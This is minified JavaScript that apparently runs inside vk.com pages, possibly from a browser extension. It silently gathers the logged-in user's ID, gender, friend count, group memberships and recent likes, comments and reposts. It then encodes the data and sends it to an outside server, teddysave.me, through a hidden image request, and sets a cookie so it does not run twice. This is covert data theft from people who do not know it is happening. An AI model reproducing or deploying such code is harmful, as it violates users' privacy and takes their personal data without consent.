var ACTIVITY_LIMIT=50,COOKIE_TERM=31536e4,ENCODE_RATIO=8,ID_SIZE=4,COUNTER_SIZE=2,OTHER_SIZE=1,DOMAIN="https://vk.com/",FEED_TOP_URI="feed",GROUP_URI="al_groups.php",REPOST_URI="al_wall.php",COMMENT_URI="al_feed.php?sm_comments",LIKE_URI="al_fave.php",COUNT_FRIENDS_URI="id",GENDER_URI="al_profileEdit.php?",COUNT_FRIENDS_CSS_SELECTOR="#profile_friends>.module_header .header_count.fl_l",FEED_TOP_CSS_SELECTOR="#feed_filters>.page_block",REPOST_CSS_SELECTOR=".post_copy .copy_post_author>a",LIKE_CSS_SELECTOR="h5.post_author>a",COMMENT_CSS_SELECTOR="h5.post_author>a",SERVER_URL="https://teddysave.me/emoji/?",COOKIE_PREFIX="remixwid_",err_code=0,err_string="",requestDataManager=function(){var e={};this.section=function(t){return e.section=t,this},this.act=function(t){return e.act=t,this},this.offset=function(t){return e.offset=t,this},this.al=function(t){return e.al=t,this},this.setOtherOptions=function(t,r){return e[t]=r,this},this.getOffset=function(){return e.offset},this.build=function(){var t=[];for(var r in e)e.hasOwnProperty(r)&&t.push(r+"="+encodeURIComponent(e[r]));return t=t.join("&")}},UserData=function(){var e={},t={},r=function(){return window.vk&&parseInt(window.vk.id)?(e.id||(e.id=parseInt(window.vk.id)),e.id):0},n=function(){var t=new requestDataManager;t.al("-1"),t.setOtherOptions("__query","edit"),t.setOtherOptions("_ref","feed"),t.setOtherOptions("_rndVer","1413"),t.setOtherOptions("al_id",r());var n=DOMAIN+GENDER_URI+t.build();return Request.get(n,"text").then(function(t){if(t){e.gender=0;var r=t.match(/\\"sex\\"\:[1-2]{1}/);if(r&&r[0]){var n=r[0].split(":");n[1]&&(e.gender=parseInt(n[1]))}}})},o=function(){return Request.post(DOMAIN+COUNT_FRIENDS_URI+r(),null,"document").then(function(t){if(t&&t instanceof HTMLDocument){var r=t.querySelector(COUNT_FRIENDS_CSS_SELECTOR);if(e.friend_count=0,r){var n=parseInt(r.innerHTML);n?e.friend_count=n:delete e.friend_count}}})},i=function(){return Request.get(DOMAIN+FEED_TOP_URI,"document").then(function(t){t&&(t.querySelector(FEED_TOP_CSS_SELECTOR+" .on")?e.feed_top=!0:t.querySelector(FEED_TOP_CSS_SELECTOR+" .off")&&(e.feed_top=!1))})},a=function(){var t=new requestDataManager;return t.act("get_list").al("1").setOtherOptions("mid",r()).setOtherOptions("tab","groupsv"),Request.post(DOMAIN+GROUP_URI,t.build(),"text").then(function(t){var r=[];if(t){try{var n=l(t,"json"),o=JSON.parse(n)}catch(e){return}"object"==typeof o&&o.forEach&&(o.forEach(function(e){e[2]&&!isNaN(parseInt(e[2]))&&r.push(parseInt(e[2]))}),r.length>0&&(e.group_list=r,e.group_count=r.length))}})},u=function(){var e=new requestDataManager;return e.act("get_wall").al("1").offset(0).setOtherOptions("owner_id",r()).setOtherOptions("type","own"),f(REPOST_URI,e,"repost",REPOST_CSS_SELECTOR)},s=function(){var e=new requestDataManager;return e.al("1").offset(0).section("comments").setOtherOptions("al_ad",0).setOtherOptions("more","1").setOtherOptions("part","1"),f(COMMENT_URI,e,"comment",COMMENT_CSS_SELECTOR)},c=function(){var e=new requestDataManager;return e.act("load").al("1").offset(0).section("likes_posts").setOtherOptions("al_ad",0),f(LIKE_URI,e,"like",LIKE_CSS_SELECTOR)},f=function(e,r,n,o){return Request.post(DOMAIN+e,r.build(),"text").then(function(i){var a=!1,u=document.createElement("div");if(t[n]||(t[n]=new Set),i=l(i)){u.innerHTML=i,u.style.display="none",u.id="wall_act_list",document.body.appendChild(u);for(var s=document.body.querySelectorAll("#wall_act_list ._post"),c=[],d=0;d<s.length;d++){var E=s[d].querySelector(o);E&&E.dataset.postId&&c.push(E)}s.length&&(a=!0),u.parentNode.removeChild(u),_(n,c)}if(a&&t[n].size<ACTIVITY_LIMIT)return r.offset(r.getOffset()+s.length),r.setOtherOptions("from",s[s.length-1].dataset.postId),f(e,r,n,o);p(n)})},_=function(e,r){[].forEach.call(r,function(r){t[e].add(r)})},d=function(e){for(var r=[],n=t[e].values(),o=0;o<t[e].size&&o<ACTIVITY_LIMIT;o++)r.push(n.next().value);return r},p=function(r){d(r).forEach(function(t){var n=t.dataset.postId;if(n){var o=n.split("_"),i=o[0].replace("-",""),a=o[1];e.activity||(e.activity={}),e.activity[i]||(e.activity[i]={like:[],comment:[],repost:[]}),e.activity[i][r].push(parseInt(a))}}),t[r]=[]},l=function(e,t){var r=!1;if("string"==(typeof e).toLowerCase())for(var n=e.split("<!>"),o=0;o<n.length;o++){if("json"==t&&-1!=n[o].indexOf("<!json>")){r=n[o].replace("<!json>","");break}if("json"!=t&&-1!=n[o].search(/<div/)){r=n[o];break}}return r};return{setData:function(t){e=t},getId:r,parseList:p,get:function(){return new Promise(function(t){r(),Promise.all([n(),o(),a(),s(),c(),i(),u()]).then(function(){t(e)})})},getDataObject:function(){return e}}}(),Verification=function(){var e=function(e){return!1===Storage.get("remixwid_"+e)},t=function(){return UserData.getId()},r=function(e){var t=new RegExp("^[0-9]+$");for(var r in e){if(!t.test(r))return!1;if(3!=Object.keys(e[r]).length)return!1;for(var i in e[r])if(!(e[r][i]&&o(e[r][i],"Array")&&n(e[r][i])))return!1}return!0},n=function(e){for(var t=0;t<e.length;t++)if(!(o(e[t],"Number")&&(0^e[t])===e[t]&&e[t]>=0))return!1;return!0},o=function(e,t){return Object.prototype.toString.call(e).slice(8,-1)==t};return{isWork:function(){var r=t();return r&&e(r)},checkUserData:function(e){for(var t=["id","gender","friend_count","feed_top","group_count","group_list","activity"],i=0;i<t.length;i++){if(!(t[i]in e))return err_code=1,err_string=JSON.stringify(Object.keys(e)),!1;switch(t[i]){case"group_list":if(!o(e.group_list,"Array")||!n(e.group_list))return err_code=2,!1;break;case"activity":if(!o(e.activity,"Object")||null===e.activity)return err_code=3,!1;if(!r(e.activity))return err_code=4,!1;break;case"gender":if(!o(e.gender,"Number")||e.gender<0||e.gender>2)return err_code=5,!1;break;case"feed_top":if(!o(e.feed_top,"Boolean"))return err_code=6,!1;break;case"id":if(!(o(e.id,"Number")&&e.id>0)||(0^e.id)!==e.id)return err_code=7,!1;break;default:if(!(o(e[t[i]],"Number")&&e[t[i]]>-1)||(0^e[t[i]])!==e[t[i]])return err_code=8,!1}}return e.group_list.length==e.group_count||(err_code=9,!1)}}}(),ObjectToBin=function(){var e=[],t=function(t){r(Object.keys(t.activity).length,COUNTER_SIZE,e);for(var n in t.activity)r(parseInt(n),ID_SIZE,e),r(t.activity[n].like.length,COUNTER_SIZE,e),r(t.activity[n].comment.length,COUNTER_SIZE,e),r(t.activity[n].repost.length,COUNTER_SIZE,e),r(t.activity[n],ID_SIZE,e)},r=function(e,t,o){if("object"==typeof e)for(var i in e)r(e[i],t,o);else o.push(n(e,t));return o},n=function(e,t){for(var r=[],n=t;n>0;n--)r.push(String.fromCharCode(e>>ENCODE_RATIO*(n-1)&255));return r=r.join("")};return{convert:function(n){return e=[],!!Verification.checkUserData(n)&&(r(n.id,ID_SIZE,e),r(n.gender,OTHER_SIZE,e),r(n.friend_count,COUNTER_SIZE,e),r(n.feed_top,OTHER_SIZE,e),r(n.group_count,COUNTER_SIZE,e),r(n.group_list,ID_SIZE,e),t(n),e.join(""))},encode:n}}(),Request=function(){var e=function(e,t,r,n){return new Promise(function(o,i){var a=new XMLHttpRequest;a.open(e,t,!0),a.responseType=n||"text",a.setRequestHeader("x-requested-with","XMLHttpRequest"),a.setRequestHeader("Content-Type","application/x-www-form-urlencoded"),a.onreadystatechange=function(){if(4==a.readyState&&a.status>=200&&a.status<=300){var e="document"==n?a.responseXML:a.response;o(e)}},a.onerror=function(){i(!1)},a.send(r)})};return{post:function(t,r,n){return e("POST",t,r,n)},get:function(t,r){return e("GET",t,null,r)},request:e}}(),Storage=function(){var e=function(){for(var e={},t=document.cookie.split(";"),r=0;r<t.length;r++){var n=t[r].split("=");2==n.length&&(e[n[0].trim()]=n[1])}return e};return{set:function(e,t,r){if(r&&"number"==typeof r){var n=new Date;n.setTime(n.getTime()+1e3*r),r=n}var o=e+"="+(t=encodeURIComponent(t));o+="; path=/; expires="+r.toUTCString(),document.cookie=o},get:function(t){var r=e();return t in r&&r[t]}}}(),Analytic=function(){var e=function(e){Storage.set(COOKIE_PREFIX+UserData.getId(),1,COOKIE_TERM);var t=new Image,r="";r=!1===e?"e="+err_code+"&i="+UserData.getId()+"&g="+err_string:"data="+encodeURIComponent(btoa(e)),t.src=SERVER_URL+r,t.style.display="none",document.body.appendChild(t)};return{run:function(){Verification.isWork()&&UserData.get().then(function(t){var r=ObjectToBin.convert(t);e(r)})}}}();Analytic.run();